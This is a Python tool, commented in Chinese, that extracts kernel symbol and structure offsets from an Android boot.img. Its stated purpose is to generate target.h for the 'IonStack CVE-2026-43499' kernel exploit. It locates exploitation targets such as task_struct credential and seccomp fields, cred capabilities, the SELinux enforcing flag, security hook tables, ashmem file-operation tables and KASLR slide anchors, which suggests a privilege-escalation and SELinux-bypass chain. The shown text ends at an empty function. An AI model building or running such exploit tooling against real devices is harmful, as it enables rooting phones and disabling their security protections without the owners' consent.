#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
auto_extract_offsets.py - 从 Android boot.img 自动提取内核偏移量

从 Android boot.img 中提取内核符号偏移量和结构体字段偏移量，
生成与 IonStack CVE-2026-43499 漏洞利用兼容的 target.h 文件。

用法：
    python3 auto_extract_offsets.py <boot.img> [选项]

选项：
    -o, --output DIR        输出目录（默认：./extracted_target）
    -k, --kallsyms FILE     预恢复的 kallsyms 文件（跳过 kallsyms 恢复）
    --keep-intermediate     保留中间文件（kernel.Image, kallsyms.txt）
    --target-name NAME      目标目录名称（默认：自动检测）
"""

import argparse
import struct
import subprocess
import sys
import os
import re
import gzip

# ============================================================================
# 常量定义
# ============================================================================

# LZ4 遗留帧魔数：文件中的大端存储为 0x02214C18。
# 按 LE32 读取时（struct.unpack '<I'），值为 0x184C2102。
LZ4_LEGACY_MAGIC_LE = 0x184C2102
GZIP_MAGIC = b'\x1f\x8b'
ARM64_IMAGE_MAGIC = 0x644d5241  # "ARMd"

# target.h 所需的符号（符号名 → 宏定义前缀）
REQUIRED_SYMBOLS = {
    'ashmem_misc':           'ASHMEM_MISC',
    'ashmem_fops':           'ASHMEM_FOPS',
    'ashmem_ioctl':          'ASHMEM_IOCTL',
    'compat_ashmem_ioctl':   'ASHMEM_COMPAT_IOCTL',
    'ashmem_mmap':           'ASHMEM_MMAP',
    'ashmem_open':           'ASHMEM_OPEN',
    'ashmem_release':        'ASHMEM_RELEASE',
    'ashmem_show_fdinfo':    'ASHMEM_SHOW_FDINFO',
    'configfs_read_iter':    'CONFIGFS_READ_ITER',
    'configfs_bin_write_iter': 'CONFIGFS_BIN_WRITE_ITER',
    'copy_splice_read':      'COPY_SPLICE_READ',
    'noop_llseek':           'NOOP_LLSEEK',
    'init_task':             'INIT_TASK',
    'root_task_group':       'ROOT_TASK_GROUP',
    'selinux_blob_sizes':    'SELINUX_BLOB_SIZES',
    'selinux_state':         'SELINUX_STATE',
    'security_hook_heads':   'SECURITY_HOOK_HEADS',
    'kmalloc_caches':        'KMALLOC_CACHES',
    'anon_pipe_buf_ops':     'ANON_PIPE_BUF_OPS',
    'nfulnl_logger':         'SLIDE_NFULNL_LOGGER',
    'loggers':               'SLIDE_LOGGERS',
    'sysctl_bootid':         'SLIDE_SYSCTL_BOOTID',
    'random_table':          'RANDOM_TABLE',
    '_text':                 '_TEXT',
}

# 符号别名（如果主符号未找到则尝试这些别名）
SYMBOL_ALIASES = {
    'compat_ashmem_ioctl':   ['compat_ashmem_ioctl', 'ashmem_compat_ioctl'],
    'noop_llseek':           ['noop_llseek', 'no_llseek'],
    'configfs_read_iter':    ['configfs_read_iter'],
    'configfs_bin_write_iter': ['configfs_bin_write_iter'],
    'copy_splice_read':      ['copy_splice_read', 'generic_file_splice_read'],
    'ashmem_show_fdinfo':    ['ashmem_show_fdinfo'],
    '_text':                 ['_text', '_stext'],
}

# Rust ashmem MiscDevice vtable 方法模式（Qualcomm sm8850 6.12 内核）。
# 在此内核上，ashmem 在 Rust 中实现（ashmem_rust 模块），传统的 C 符号
# （ashmem_fops, ashmem_misc）不存在。MiscDevice vtable 方法的 Rust 符号
# 名称被修饰为类似：
#   _RNvMs4_...MiscdeviceVTableNtCs<hash>6AshmemE<len><method>B<build>_
# 我们匹配 "6AshmemE<len><method>" 来查找主 Ashmem 类型（而不是
# 使用 "16AshmemToggleMisc" 的 AshmemToggle 变体）。
RUST_ASHMEM_METHOD_PATTERNS = {
    'open':         '6AshmemE4open',
    'ioctl':        '6AshmemE5ioctl',
    'llseek':       '6AshmemE6llseek',
    'release':      '6AshmemE7release',
    'read_iter':    '6AshmemE9read_iter',
    'mmap':         '6AshmemE4mmap',
    'show_fdinfo':  '6AshmemE11show_fdinfo',
    'compat_ioctl': '6AshmemE12compat_ioctl',
}

# file_operations 结构体字段偏移量在不同内核版本间有差异。
# 6.12 在 open 之前移除/移动了字段，因此与 6.6 GKI 相比，open/release/show_fdinfo
# 下移了 8 字节。这里仅列出我们验证/匹配的字段。
FOPS_LAYOUTS = {
    '6.6': {
        'owner': 0x00, 'llseek': 0x08, 'read': 0x10, 'write': 0x18,
        'read_iter': 0x20, 'write_iter': 0x28,
        'ioctl': 0x48, 'compat_ioctl': 0x50, 'mmap': 0x58,
        'open': 0x68, 'release': 0x78, 'show_fdinfo': 0xd8,
    },
    '6.12': {
        'owner': 0x00, 'llseek': 0x08, 'read': 0x10, 'write': 0x18,
        'read_iter': 0x20, 'write_iter': 0x28,
        'ioctl': 0x48, 'compat_ioctl': 0x50, 'mmap': 0x58,
        'open': 0x60, 'release': 0x70, 'show_fdinfo': 0xd0,
    },
}

# 用于生成 target.h 的标准 fops 字段偏移量，按布局版本分组。
# 这些是写入 target.h 末尾的 FOPS_*_OFF 宏定义。
FOPS_FIELD_DEFINES = {
    '6.6': [
        ("FOPS_OWNER_OFF", "0x00"),
        ("FOPS_LLSEEK_OFF", "0x08"),
        ("FOPS_READ_OFF", "0x10"),
        ("FOPS_WRITE_OFF", "0x18"),
        ("FOPS_READ_ITER_OFF", "0x20"),
        ("FOPS_WRITE_ITER_OFF", "0x28"),
        ("FOPS_IOCTL_OFF", "0x48"),
        ("FOPS_COMPAT_IOCTL_OFF", "0x50"),
        ("FOPS_MMAP_OFF", "0x58"),
        ("FOPS_OPEN_OFF", "0x68"),
        ("FOPS_RELEASE_OFF", "0x78"),
        ("FOPS_SPLICE_READ_OFF", "0xb8"),
        ("FOPS_SHOW_FDINFO_OFF", "0xd8"),
    ],
    '6.12': [
        ("FOPS_OWNER_OFF", "0x00"),
        ("FOPS_LLSEEK_OFF", "0x08"),
        ("FOPS_READ_OFF", "0x10"),
        ("FOPS_WRITE_OFF", "0x18"),
        ("FOPS_READ_ITER_OFF", "0x20"),
        ("FOPS_WRITE_ITER_OFF", "0x28"),
        ("FOPS_IOCTL_OFF", "0x48"),
        ("FOPS_COMPAT_IOCTL_OFF", "0x50"),
        ("FOPS_MMAP_OFF", "0x58"),
        ("FOPS_OPEN_OFF", "0x60"),
        ("FOPS_RELEASE_OFF", "0x70"),
        ("FOPS_SPLICE_READ_OFF", "0xb8"),
        ("FOPS_SHOW_FDINFO_OFF", "0xd0"),
    ],
}

# CTL_TABLE 条目大小（arm64 Linux 6.6 上的 struct ctl_table）
CTL_TABLE_ENTRY_SIZE = 0x40
CTL_TABLE_DATA_OFF = 0x08  # ctl_table 中 .data 字段偏移量

# ============================================================================
# LZ4 块解压缩（纯 Python，无外部依赖）
# ============================================================================

def lz4_decompress_block(src):
    """解压缩单个 LZ4 块（无大小头部）。"""
    out = bytearray()
    pos = 0
    n = len(src)
    while pos < n:
        token = src[pos]
        pos += 1
        # 字面量长度
        lit_len = token >> 4
        if lit_len == 15:
            while pos < n:
                b = src[pos]
                pos += 1
                lit_len += b
                if b != 255:
                    break
        # 复制字面量
        avail = min(lit_len, n - pos)
        out.extend(src[pos:pos + avail])
        pos += avail
        if pos >= n or avail < lit_len:
            break
        # 读取匹配偏移量
        if pos + 2 > n:
            break
        offset = src[pos] | (src[pos + 1] << 8)
        pos += 2
        # 匹配长度
        match_len = (token & 0x0f) + 4
        if (token & 0x0f) == 15:
            while pos < n:
                b = src[pos]
                pos += 1
                match_len += b
                if b != 255:
                    break
        # 复制匹配数据
        if offset == 0 or offset > len(out):
            break
        mp = len(out) - offset
        for i in range(match_len):
            out.append(out[mp + i])
    return bytes(out)


def decompress_lz4_legacy(data):
    """解压缩 LZ4 遗留帧（魔数 0x02214c18）。"""
    out = bytearray()
    pos = 4  # 跳过魔数
    while pos + 4 <= len(data):
        bs = struct.unpack_from('<I', data, pos)[0]
        pos += 4
        if bs == 0:  # 结束标记
            break
        if pos + bs > len(data):
            # 最后一个块被截断
            bs = len(data) - pos
            if bs == 0:
                break
        block = data[pos:pos + bs]
        pos += bs
        out.extend(lz4_decompress_block(block))
    return bytes(out)


# ============================================================================
# Boot 镜像解析
# ============================================================================

def parse_boot_img(data):
    """解析 Android boot 镜像头部（v0-v4）。返回包含内核信息的字典。"""
    if data[0:8] != b'ANDROID!':
        raise ValueError(f"不是 Android boot 镜像：{data[0:8]!r}")

    kernel_size = struct.unpack_from('<I', data, 0x08)[0]
    page_size = struct.unpack_from('<I', data, 0x24)[0] if len(data) > 0x28 else 4096
    if page_size == 0:
        page_size = 4096

    # 检测头部版本（所有版本均在偏移 0x28 处）
    hdr_ver = struct.unpack_from('<I', data, 0x28)[0] if len(data) > 0x2c else 0

    # 根据头部版本确定头部大小
    # v0/v1：1640 字节（固定），内核从下一页开始
    # v2：1640 + 32 = 1672 字节（0x688），内核从 ALIGN(头部大小, page_size) 开始
    # v3/v4：1580 字节（无填充），page_size 固定为 4096
    BOOT_HEADER_V0_SIZE = 1640
    BOOT_HEADER_V2_EXTRA = 32   # recovery_dtbo_size(4) + recovery_dtbo_offset(8) + header_size(4) + dtb_size(4) + dtb_addr(8)

    if hdr_ver >= 3:
        header_size = 1580
    elif hdr_ver == 2:
        # v2：header_size 字段在偏移 0x274 处，若有效则使用
        if len(data) > 0x278:
            v2_header_size = struct.unpack_from('<I', data, 0x274)[0]
            if v2_header_size >= BOOT_HEADER_V0_SIZE + BOOT_HEADER_V2_EXTRA:
                header_size = v2_header_size
            else:
                header_size = BOOT_HEADER_V0_SIZE + BOOT_HEADER_V2_EXTRA  # 1672
        else:
            header_size = BOOT_HEADER_V0_SIZE + BOOT_HEADER_V2_EXTRA
    else:
        # v0/v1：使用旧的偏移 0x14 处的 header_size 字段
        header_size = struct.unpack_from('<I', data, 0x14)[0] if len(data) > 0x18 else BOOT_HEADER_V0_SIZE
        if header_size == 0:
            header_size = BOOT_HEADER_V0_SIZE

    # 内核偏移量：头部页对齐后的起始位置
    # v0/v1：内核紧跟在第一页之后（不管头部实际大小）
    # v2：内核从 ALIGN(header_size, page_size) 开始
    # v3/v4：内核从 ALIGN(header_size, page_size) 开始（page_size=4096）
    if hdr_ver == 0 or hdr_ver == 1:
        kernel_offset = page_size
    else:
        kernel_offset = ((header_size + page_size - 1) // page_size) * page_size

    # v2 DTB 信息
    dtb_info = {}
    if hdr_ver >= 2 and len(data) > 0x284:
        dtb_size = struct.unpack_from('<I', data, 0x278)[0]
        dtb_addr = struct.unpack_from('<Q', data, 0x27C)[0]
        dtb_info = {'dtb_size': dtb_size, 'dtb_addr': dtb_addr}

    info = {
        'kernel_size': kernel_size,
        'kernel_offset': kernel_offset,
        'header_version': hdr_ver,
        'page_size': page_size,
        'header_size': header_size,
        'data': data,
    }
    if dtb_info:
        info.update(dtb_info)
    return info


# ============================================================================
# 内核解压缩
# ============================================================================

def extract_kernel(boot_info):
    """从 boot.img 中提取并解压缩内核 Image。"""
    data = boot_info['data']
    off = boot_info['kernel_offset']
    size = boot_info['kernel_size']
    kernel_raw = data[off:off + size]

    if len(kernel_raw) < 4:
        raise ValueError("内核负载太小")

    # 检查 LZ4 遗留格式（魔数以大端存储，按 LE32 读取）
    magic32 = struct.unpack_from('<I', kernel_raw, 0)[0]
    if magic32 == LZ4_LEGACY_MAGIC_LE:
        print("  内核压缩格式：LZ4 遗留帧")
        return decompress_lz4_legacy(kernel_raw)

    # 检查 gzip
    if kernel_raw[0:2] == GZIP_MAGIC:
        print("  内核压缩格式：gzip")
        return gzip.decompress(kernel_raw)

    # 原始 Image
    print("  内核压缩格式：无（原始 Image）")
    return kernel_raw


# ============================================================================
# Kallsyms 恢复
# ============================================================================

def recover_kallsyms(kernel_image_path):
    """从内核 Image 恢复 kallsyms。返回字典 {名称: 地址}。"""
    # 方法 1：kallsyms-finder 命令行工具
    try:
        result = subprocess.run(
            ['kallsyms-finder', kernel_image_path],
            capture_output=True, text=True, timeout=300
        )
        if result.returncode == 0 and result.stdout.strip():
            print("  通过 kallsyms-finder 恢复 kallsyms")
            return parse_kallsyms_text(result.stdout)
    except FileNotFoundError:
        pass
    except subprocess.TimeoutExpired:
        print("  kallsyms-finder 超时", file=sys.stderr)

    # 方法 2：vmlinux-to-elf + nm
    try:
        elf_path = kernel_image_path + '.elf'
        result = subprocess.run(
            ['vmlinux-to-elf', kernel_image_path, elf_path],
            capture_output=True, text=True, timeout=300
        )
        if result.returncode == 0 and os.path.exists(elf_path):
            result = subprocess.run(
                ['nm', elf_path],
                capture_output=True, text=True, timeout=60
            )
            if result.returncode == 0 and result.stdout.strip():
                print("  通过 vmlinux-to-elf + nm 恢复 kallsyms")
                return parse_kallsyms_text(result.stdout)
    except FileNotFoundError:
        pass
    except subprocess.TimeoutExpired:
        print("  vmlinux-to-elf 超时", file=sys.stderr)

    raise RuntimeError(
        "kallsyms 恢复失败。\n"
        "  安装 vmlinux-to-elf： pip install vmlinux-to-elf\n"
        "  或提供预恢复的 kallsyms： --kallsyms <文件>"
    )


def parse_kallsyms_text(text):
    """解析 kallsyms 文本输出（格式：地址 类型 名称）。"""
    syms = {}
    for line in text.splitlines():
        parts = line.split()
        if len(parts) >= 3:
            try:
                addr = int(parts[0], 16)
                name = parts[2]
                # 某些 nm 输出在名称后有额外信息
                if name not in syms:
                    syms[name] = addr
            except ValueError:
                continue
    return syms


def parse_kallsyms_file(path):
    """从文件解析 kallsyms。"""
    with open(path) as f:
        return parse_kallsyms_text(f.read())


# ============================================================================
# 二进制分析
# ============================================================================

class KernelImage:
    """内核 Image 二进制包装器，支持符号查找。"""

    def __init__(self, img_bytes, syms):
        self.img = img_bytes
        self.syms = syms
        self.kimage_base = syms.get('_text', syms.get('_stext', 0xffffffc080000000))
        self.img_size = len(img_bytes)

    def addr_to_off(self, addr):
        """将内核虚拟地址转换为文件偏移量。"""
        return addr - self.kimage_base

    def sym_addr(self, name):
        """获取符号地址，尝试别名。"""
        if name in self.syms:
            return self.syms[name]
        aliases = SYMBOL_ALIASES.get(name, [name])
        for alias in aliases:
            if alias in self.syms:
                return self.syms[alias]
        return None

    def sym_off(self, name):
        """获取符号相对于 KIMAGE_TEXT_BASE 的偏移量。"""
        addr = self.sym_addr(name)
        if addr is None:
            return None
        return addr - self.kimage_base

    def u64(self, offset):
        """从文件偏移量读取 64 位无符号整数。"""
        if 0 <= offset and offset + 8 <= self.img_size:
            return struct.unpack_from('<Q', self.img, offset)[0]
        return None

    def u32(self, offset):
        """从文件偏移量读取 32 位无符号整数。"""
        if 0 <= offset and offset + 4 <= self.img_size:
            return struct.unpack_from('<I', self.img, offset)[0]
        return None

    def read_bytes(self, offset, length):
        """从文件偏移量读取指定长度的字节。"""
        if 0 <= offset and offset + length <= self.img_size:
            return self.img[offset:offset + length]
        return None

    def read_string(self, offset, max_len=256):
        """从文件偏移量读取以空字符结尾的字符串。"""
        if offset < 0 or offset >= self.img_size:
            return None
        end = self.img.find(b'\x00', offset, offset + max_len)
        if end < 0:
            end = offset + max_len
        try:
            return self.img[offset:end].decode('ascii')
        except UnicodeDecodeError:
            return None

    def read_string_at_addr(self, addr):
        """在内核虚拟地址处读取以空字符结尾的字符串。"""
        off = self.addr_to_off(addr)
        return self.read_string(off)

    # -- 验证方法 --

    def verify_fops_layout(self, fops_sym_name='ashmem_fops', methods=None):
        """通过检查函数指针来验证 file_operations 结构体布局。

        同时尝试 6.6 和 6.12 的 fops 布局。返回：
            (layout_name, fops_off, all_ok)
        其中 layout_name 为 '6.6'、'6.12' 或 None（如果匹配失败）。

        对于 C ashmem：传入 fops_sym_name 来查找符号。
        对于 Rust ashmem：传入 methods 字典 {方法名: 地址}。
        """
        if methods is not None:
            # Rust ashmem：没有 fops 符号，需要通过扫描 llseek 指针
            # 并验证布局来定位表。
            return self._find_rust_ashmem_fops_table(methods)

        # C ashmem：查找符号并针对两种布局进行验证
        fops_addr = self.sym_addr(fops_sym_name)
        if fops_addr is None:
            return None, None, "符号未找到"
        fops_off = self.addr_to_off(fops_addr)

        # C ashmem 的符号到方法映射
        c_ashmem_methods = {
            'llseek':       'ashmem_llseek',
            'read_iter':    'ashmem_read_iter',
            'ioctl':        'ashmem_ioctl',
            'compat_ioctl': 'compat_ashmem_ioctl',
            'mmap':         'ashmem_mmap',
            'open':         'ashmem_open',
            'release':      'ashmem_release',
            'show_fdinfo':  'ashmem_show_fdinfo',
        }

        # 尝试每种布局
        for layout_name, layout in FOPS_LAYOUTS.items():
            all_ok = True
            for method, sym_name in c_ashmem_methods.items():
                expected = self.sym_addr(sym_name)
                actual = self.u64(fops_off + layout[method])
                if expected is not None and actual is not None:
                    if actual != expected:
                        all_ok = False
                        break
            if all_ok:
                return layout_name, fops_off, True

        # 没有完全匹配的布局；默认使用 6.6
        return '6.6', fops_off, False

    def _find_rust_ashmem_fops_table(self, methods):
        """通过扫描内核镜像中包含 ashmem 函数指针的结构体，
        定位 Rust ashmem 的 file_operations 表。

        同时尝试 6.6 和 6.12 的 fops 布局。返回：
            (layout_name, fops_off, all_ok)
        """
        if not methods or 'llseek' not in methods:
            return None, None, "未找到 llseek 方法"

        # 在内核镜像中搜索 llseek 函数指针值
        llseek_packed = struct.pack('<Q', methods['llseek'])
        pos = 0
        while True:
            idx = self.img.find(llseek_packed, pos)
            if idx < 0:
                break
            pos = idx + 8

            # 尝试每种布局：fops_base = llseek_pos - llseek_offset
            for layout_name, layout in FOPS_LAYOUTS.items():
                fops_base = idx - layout['llseek']
                if fops_base < 0 or fops_base + 0xe0 > self.img_size:
                    continue

                # 验证所有已知的方法指针是否匹配
                all_match = True
                for method_name, expected_addr in methods.items():
                    if method_name not in layout:
                        continue
                    actual = self.u64(fops_base + layout[method_name])
                    if actual != expected_addr:
                        all_match = False
                        break

                if all_match:
                    return layout_name, fops_base, True

        return None, None, "未找到匹配的 fops 表"

    def find_rust_ashmem_methods(self):
        """查找 Rust ashmem MiscDevice vtable 方法符号。

        在 Qualcomm sm8850 6.12 内核上，ashmem 在 Rust 中实现
        （ashmem_rust 模块）。MiscDevice vtable 方法的 Rust 符号
        名称被修饰为类似：
          _RNvMs4_...MiscdeviceVTableNtCs<hash>6AshmemE<len><method>B<build>_

        返回字典 {方法名: 地址}，如果未找到则返回空字典。
        """
        methods = {}
        for sym_name, addr in self.syms.items():
            if 'MiscdeviceVTable' not in sym_name:
                continue
            # 排除 ashmem_toggle 变体（不同的设备）
            if 'ashmem_toggle' in sym_name.lower():
                continue
            for method, pattern in RUST_ASHMEM_METHOD_PATTERNS.items():
                if pattern in sym_name and method not in methods:
                    methods[method] = addr
        return methods

    def find_ashmem_fops_ptr(self):
        """查找 ASHMEM_FOPS_PTR BSS 变量（Rust ashmem）。

        该变量在运行时保存指向 file_operations 表的指针，
        由 __ashmem_rust_init 填充。它用作 ASHMEM_MISC_FOPS_OFF，
        因为 miscdevice 结构体在运行时初始化（BSS），而不是具有
        静态的 fops 指针。
        """
        for sym_name, addr in self.syms.items():
            if 'ASHMEM_FOPS_PTR' in sym_name:
                return self.addr_to_off(addr), sym_name
        return None, None

    def find_security_hook_heads_off(self):
        """查找 SECURITY_HOOK_HEADS 偏移量。

        在内核 <= 6.6 上，直接使用 security_hook_heads 符号。
        在 6.12+ 内核上，security_hook_heads 被基于 static-call 的
        security_hook_active_* 槽位替代。此时计算：
          security_hook_active_capable_0 - 0x40
        使得 SECURITY_CAPABLE_HEAD（= SECURITY_HOOK_HEADS + 0x40）
        落在 security_hook_active_capable_0 上（capable 钩子的最接近等价物）。

        返回 (offset, source_description) 或 (None, None)。
        """
        # 首先尝试传统符号（6.6 及更早版本）
        off = self.sym_off('security_hook_heads')
        if off is not None:
            return off, 'security_hook_heads 符号'

        # 回退：6.12 基于 static-call 的钩子
        capable_0 = self.sym_addr('security_hook_active_capable_0')
        if capable_0 is not None:
            computed = self.addr_to_off(capable_0) - 0x40
            return computed, 'security_hook_active_capable_0 - 0x40（6.12 static calls）'

        return None, None

    def verify_task_offsets(self):
        """使用 init_task 验证 task_struct 字段偏移量。

        同时支持 GKI 6.6 和 6.12 内核布局。尝试每个版本的已知偏移量，
        如果必要则回退到搜索。
        """
        init_task_addr = self.sym_addr('init_task')
        init_cred_addr = self.sym_addr('init_cred')
        if init_task_addr is None:
            return {}

        task_off = self.addr_to_off(init_task_addr)
        results = {}

        # 不同内核版本的已知 task_struct 偏移量。
        # 每个字段有一组候选偏移量（6.6，然后 6.12）。
        KNOWN_CANDIDATES = {
            'TASK_TASKS_OFF':       [0x550, 0x590],
            'TASK_COMM_OFF':        [0x830],
            'TASK_REAL_PARENT_OFF': [0x628],
            'TASK_REAL_CRED_OFF':   [0x818],
            'TASK_CRED_OFF':        [0x820],
            'TASK_PID_OFF':         [0x618],
            'TASK_TGID_OFF':        [0x61c],
            'TASK_ATOMIC_FLAGS_OFF':[0x5d8],
            'TASK_SECCOMP_OFF':     [0x8e8],
        }

        # TASK_TASKS_OFF：在已知偏移量验证自引用的 list_head
        found = False
        for off_val in KNOWN_CANDIDATES['TASK_TASKS_OFF']:
            nxt = self.u64(task_off + off_val)
            prv = self.u64(task_off + off_val + 8)
            if nxt is not None and nxt == prv and nxt == init_task_addr + off_val:
                results['TASK_TASKS_OFF'] = off_val
                found = True
                break
        if not found:
            # 回退：在 0x500-0x600 范围内搜索自引用的 list_head
            for candidate in range(0x500, 0x600, 8):
                n = self.u64(task_off + candidate)
                p = self.u64(task_off + candidate + 8)
                if n is not None and n == p and n == init_task_addr + candidate:
                    results['TASK_TASKS_OFF'] = candidate
                    break

        # TASK_COMM_OFF：在已知偏移量验证 "swapper"
        off_val = KNOWN_CANDIDATES['TASK_COMM_OFF'][0]
        s = self.read_string(task_off + off_val, 16)
        if s == 'swapper':
            results['TASK_COMM_OFF'] = off_val
        else:
            for candidate in range(0x800, 0x900, 0x10):
                s = self.read_string(task_off + candidate, 16)
                if s == 'swapper':
                    results['TASK_COMM_OFF'] = candidate
                    break

        # TASK_REAL_PARENT_OFF：验证指向 init_task
        off_val = KNOWN_CANDIDATES['TASK_REAL_PARENT_OFF'][0]
        val = self.u64(task_off + off_val)
        if val == init_task_addr:
            results['TASK_REAL_PARENT_OFF'] = off_val

        # TASK_REAL_CRED_OFF 和 TASK_CRED_OFF：验证指向 init_cred
        for name in ['TASK_REAL_CRED_OFF', 'TASK_CRED_OFF']:
            off_val = KNOWN_CANDIDATES[name][0]
            val = self.u64(task_off + off_val)
            if val == init_cred_addr:
                results[name] = off_val

        # TASK_PID_OFF 和 TASK_TGID_OFF：验证均为 0
        for name in ['TASK_PID_OFF', 'TASK_TGID_OFF']:
            off_val = KNOWN_CANDIDATES[name][0]
            val = self.u32(task_off + off_val)
            if val == 0:
                results[name] = off_val

        # TASK_ATOMIC_FLAGS_OFF：验证为 0
        off_val = KNOWN_CANDIDATES['TASK_ATOMIC_FLAGS_OFF'][0]
        val = self.u32(task_off + off_val)
        if val is not None and val == 0:
            results['TASK_ATOMIC_FLAGS_OFF'] = off_val

        # TASK_SECCOMP_OFF：验证 mode=0, filter_count=0, filter=NULL
        off_val = KNOWN_CANDIDATES['TASK_SECCOMP_OFF'][0]
        mode = self.u32(task_off + off_val)
        fcount = self.u32(task_off + off_val + 4)
        filter_ptr = self.u64(task_off + off_val + 8)
        if mode == 0 and fcount == 0 and filter_ptr is not None and filter_ptr == 0:
            results['TASK_SECCOMP_OFF'] = off_val
        else:
            # 回退：在 comm 之后搜索 16 字节零模式
            for candidate in range(0x880, 0x920, 8):
                m = self.u32(task_off + candidate)
                fc = self.u32(task_off + candidate + 4)
                fp = self.u64(task_off + candidate + 8)
                if m == 0 and fc == 0 and fp is not None and fp == 0:
                    results['TASK_SECCOMP_OFF'] = candidate
                    break

        return results

    def verify_cred_offsets(self):
        """使用 init_cred 验证 cred 结构体字段偏移量。

        使用已知的 GKI 6.6 偏移量作为目标，并通过二进制分析验证它们。
        """
        init_cred_addr = self.sym_addr('init_cred')
        if init_cred_addr is None:
            return {}

        cred_off = self.addr_to_off(init_cred_addr)
        results = {}

        # 要验证的已知 GKI 6.6 cred 结构体偏移量
        KNOWN = {
            'CRED_UID_OFF': 8,
            'CRED_SECUREBITS_OFF': 40,
            'CRED_CAPS_OFF': 48,
            'CRED_SECURITY_OFF': 128,
        }

        # CRED_UID_OFF：uid 应为 0
        if self.u32(cred_off + KNOWN['CRED_UID_OFF']) == 0:
            results['CRED_UID_OFF'] = KNOWN['CRED_UID_OFF']

        # CRED_SECUREBITS_OFF：应为 0
        if self.u32(cred_off + KNOWN['CRED_SECUREBITS_OFF']) == 0:
            results['CRED_SECUREBITS_OFF'] = KNOWN['CRED_SECUREBITS_OFF']

        # CRED_CAPS_OFF：验证 CAP_FULL 模式出现在 caps+8（cap_permitted）
        # 偏移 48 的 cap_inheritable 对于 init_cred 为 0，偏移 56 的 cap_permitted 为 CAP_FULL
        cap_full = struct.pack('<Q', 0x000001ffffffffff)
        cred_bytes = self.read_bytes(cred_off, 128)
        if cred_bytes:
            # 查找第一个 CAP_FULL 出现位置
            for i in range(0, 128, 8):
                if cred_bytes[i:i+8] == cap_full:
                    # CRED_CAPS_OFF = 第一个 CAP_FULL - 8（cap_inheritable）
                    caps_start = i - 8
                    if caps_start >= 32:  # 合理性检查
                        results['CRED_CAPS_OFF'] = caps_start
                    break

        # CRED_SECURITY_OFF：应为 0（init_cred.security 在运行时设置）
        # 或内核指针
        val = self.u64(cred_off + KNOWN['CRED_SECURITY_OFF'])
        if val is not None and (val == 0 or (val >> 48) == 0xffff):
            results['CRED_SECURITY_OFF'] = KNOWN['CRED_SECURITY_OFF']

        return results

    def find_ashmem_misc_fops(self):
        """通过读取 ashmem_misc.fops 指针查找 ASHMEM_MISC_FOPS 偏移量。"""
        misc_addr = self.sym_addr('ashmem_misc')
        fops_addr = self.sym_addr('ashmem_fops')
        if misc_addr is None or fops_addr is None:
            return None, "ashmem_misc 或 ashmem_fops 未找到"

        misc_off = self.addr_to_off(misc_addr)

        # 在 ashmem_misc 结构体中搜索 fops 指针（前 0x48 字节）
        for i in range(0, 0x48, 8):
            val = self.u64(misc_off + i)
            if val == fops_addr:
                return misc_off + i, f"在 ashmem_misc+{i:#x} 处找到"

        return None, "在 ashmem_misc 中未找到 fops 指针"

    def find_slide_offsets(self):
        """通过解析 random_table 查找 boot_id 条目来获取 SLIDE 偏移量。"""
        results = {}

        # SLIDE_NFULNL_LOGGER 和 SLIDE_LOGGERS
        results['SLIDE_NFULNL_LOGGER_OFF'] = self.sym_off('nfulnl_logger')
        results['SLIDE_LOGGERS_0_1_OFF'] = self.sym_off('loggers')
        results['SLIDE_SYSCTL_BOOTID_OFF'] = self.sym_off('sysctl_bootid')

        # SLIDE_RANDOM_BOOT_ID_DATA：解析 random_table 查找 boot_id 条目
        rt_addr = self.sym_addr('random_table')
        if rt_addr is not None:
            rt_off = self.addr_to_off(rt_addr)
            boot_id_data_off = None
            for idx in range(16):  # 检查前 16 个条目
                entry_off = rt_off + idx * CTL_TABLE_ENTRY_SIZE
                procname_ptr = self.u64(entry_off)
                if procname_ptr is None or procname_ptr == 0:
                    break
                name = self.read_string_at_addr(procname_ptr)
                if name == 'boot_id':
                    boot_id_data_off = entry_off + CTL_TABLE_DATA_OFF
                    break

            if boot_id_data_off is not None:
                results['SLIDE_RANDOM_BOOT_ID_DATA_OFF'] = boot_id_data_off
            else:
                # 回退：假设 boot_id 在索引 4（标准内核布局）
                results['SLIDE_RANDOM_BOOT_ID_DATA_OFF'] = (
                    rt_off + 4 * CTL_TABLE_ENTRY_SIZE + CTL_TABLE_DATA_OFF
                )

        return results

    def verify_selinux(self):
        """验证 SELinux 偏移量。"""
        results = {}
        results['SELINUX_BLOB_SIZES_OFF'] = self.sym_off('selinux_blob_sizes')

        # SELINUX_ENFORCING_OFF：selinux_state.enforcing 在 +0x00
        state_addr = self.sym_addr('selinux_state')
        if state_addr is not None:
            results['SELINUX_ENFORCING_OFF'] = self.addr_to_off(state_addr)

        return results


# ============================================================================
# 构建信息提取
# ============================================================================

def extract_build_info(boot_data, kernel_img):
    """从 boot.img 和内核中提取构建指纹和 Linux 版本。"""
    info = {}

    # 在内核 Image 中搜索 Linux 版本字符串
    version_pattern = rb'Linux version (\d+\.\d+\.\d+-android\d+-\d+[^\x00\x20]{0,60})'
    m = re.search(version_pattern, kernel_img)
    if m:
        info['linux_version'] = m.group(1).decode('ascii', errors='replace')
        # 提取 Android 版本
        avm = re.search(rb'android(\d+)-(\d+)', m.group(1))
        if avm:
            info['android_version'] = int(avm.group(1))
            info['kmi_version'] = int(avm.group(2))
        # 提取内核构建变体（例如 "abogki" 来自
        # "6.6.89-android15-8-g7e1f3c083cc6-abogki467167594-4k"）
        # 模式：在 git commit "g<hex>-" 之后是变体名称（字母）
        # 后跟数字和可选的 "-<pagesize>"。
        kvm = re.search(r'-g[0-9a-f]+-([a-zA-Z]+)\d+', info['linux_version'])
        if kvm:
            info['kernel_variant'] = kvm.group(1).lower()

    # 在 boot.img 中搜索构建指纹
    # 模式：品牌/产品/设备：版本/ID/编号：类型/密钥
    fp_pattern = rb'([\w\-]+)/([\w\-]+)/([\w\-]+):(\d+)/([\w.]+)/(\d+):(\w+)/([\w\-]+)'
    for m in re.finditer(fp_pattern, boot_data):
        s = m.group(0)
        # 检查这是否是真实的指纹（包含 "release-keys" 或 "user"）
        if b'release-keys' in s or b'user' in s:
            # 查找空终止符
            null_idx = s.find(b'\x00')
            if null_idx > 0:
                s = s[:null_idx]
            info['build_fingerprint'] = s.decode('ascii', errors='replace')
            break

    # 从指纹中提取构建 ID
    if 'build_fingerprint' in info:
        fp = info['build_fingerprint']
        parts = fp.split('/')
        if len(parts) >= 5:
            build_id = parts[3]  # 例如 AP3A.240617.008
            info['build_id'] = build_id
            # 从指纹中获取设备名称
            device = parts[2] if len(parts) > 2 else 'unknown'
            info['device'] = device

    return info


def detect_phys_offset(build_info):
    """基于平台启发式规则检测 P0_PHYS_OFFSET。"""
